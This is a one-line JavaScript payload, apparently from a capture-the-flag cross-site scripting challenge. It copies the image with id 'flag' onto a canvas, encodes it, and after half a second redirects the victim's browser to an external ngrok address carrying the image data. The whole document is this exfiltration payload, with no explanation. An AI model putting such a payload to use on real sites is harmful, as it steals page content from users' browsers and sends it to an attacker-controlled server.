c = document.createElement("canvas"); i = document.querySelector("#flag"); setTimeout(function(){c.width = i.width; c.height = i.height; c.getContext("2d").drawImage(i, 0, 0); window.location = "http://56b9293c7559.ngrok.io/" + encodeURIComponent(c.toDataURL());}, 500)